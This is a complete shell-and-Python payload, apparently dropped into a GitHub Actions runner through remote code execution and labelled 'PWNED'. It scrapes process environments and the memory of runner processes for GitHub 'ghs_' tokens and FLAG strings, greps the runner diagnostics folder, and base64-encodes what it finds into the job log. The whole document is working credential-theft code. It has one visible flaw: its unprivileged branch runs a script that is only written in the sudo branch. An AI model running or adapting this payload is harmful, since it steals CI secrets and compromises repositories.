#!/bin/sh
echo "===PWNED-lazyhacker6-RCE-V5==="
echo "job=${GITHUB_JOB:-} ref=${GITHUB_REF:-} sha=${GITHUB_SHA:-}"
id 2>/dev/null || true
if sudo -n true 2>/dev/null; then
  echo "sudo=yes"
  cat > /tmp/memscan.py <<'PYEOF'
import os, re, base64, glob, sys

pats = {
    "flag": re.compile(rb"FLAG\{[^}]{1,300}\}"),
    "token": re.compile(rb"ghs_[A-Za-z0-9]{20,}"),
}
found = {"flag": set(), "token": set()}

def add(kind, val):
    if val not in found[kind]:
        found[kind].add(val)

def scan_blob(data):
    for k, p in pats.items():
        for m in p.findall(data):
            add(k, m[:400])

# 1. environments
for envf in glob.glob("/proc/[0-9]*/environ"):
    try:
        with open(envf, "rb") as f:
            scan_blob(f.read())
    except Exception:
        pass

# 2. memory of runner processes and any process with 'runner' in cmdline
pids = set()
for d in glob.glob("/proc/[0-9]*"):
    try:
        cmd = open(d + "/cmdline", "rb").read()
        if b"Runner" in cmd or b"actions-runner" in cmd or b"node" in cmd:
            pids.add(int(d.rsplit("/", 1)[1]))
    except Exception:
        pass

for pid in sorted(pids):
    try:
        maps = open(f"/proc/{pid}/maps").read().splitlines()
        mem = os.open(f"/proc/{pid}/mem", os.O_RDONLY)
    except Exception as e:
        continue
    for line in maps:
        parts = line.split()
        if len(parts) < 2 or "r" not in parts[1]:
            continue
        try:
            lo, hi = [int(x, 16) for x in parts[0].split("-")]
        except Exception:
            continue
        if hi <= lo or hi - lo > 128 * 1024 * 1024:
            continue
        try:
            data = os.pread(mem, hi - lo, lo)
        except Exception:
            continue
        scan_blob(data)
    os.close(mem)

for k in ("flag", "token"):
    for v in found[k]:
        print(f"{k}_b64={base64.b64encode(v).decode()}")
        print(f"{k}_len={len(v)}")
print("scan_done")
PYEOF
  echo "--- diag scan ---"
  sudo sh -c 'timeout 40 grep -rao "FLAG{[^}]*}" /home/runner/actions-runner/_diag 2>/dev/null | head -3 | base64 -w0' || true
  echo
  echo "--- memory scan ---"
  sudo timeout 300 python3 /tmp/memscan.py 2>&1 | tail -40
else
  echo "sudo=no"
  echo "--- memscan unprivileged ---"
  timeout 120 python3 /tmp/memscan.py 2>&1 | tail -20 || true
fi
echo "===PWNED-lazyhacker6-V5-END==="
exit 1
